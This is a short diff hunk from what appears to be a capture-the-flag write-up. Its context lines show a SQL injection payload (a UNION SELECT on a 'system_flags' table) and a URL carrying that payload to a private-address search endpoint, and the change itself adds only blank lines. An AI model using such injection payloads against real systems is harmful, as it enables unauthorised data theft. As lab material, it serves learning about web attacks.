@@ -249,6 +249,8 @@ The plan: use the same curl session cookie against the search endpoint's raw f-s
 ```
 q = x' UNION SELECT flag, flag FROM system_flags--
 ```
+
+
 ```
 http://10.49.133.0:8080/search?q=x' UNION SELECT flag, flag FROM system_flags--
 ```
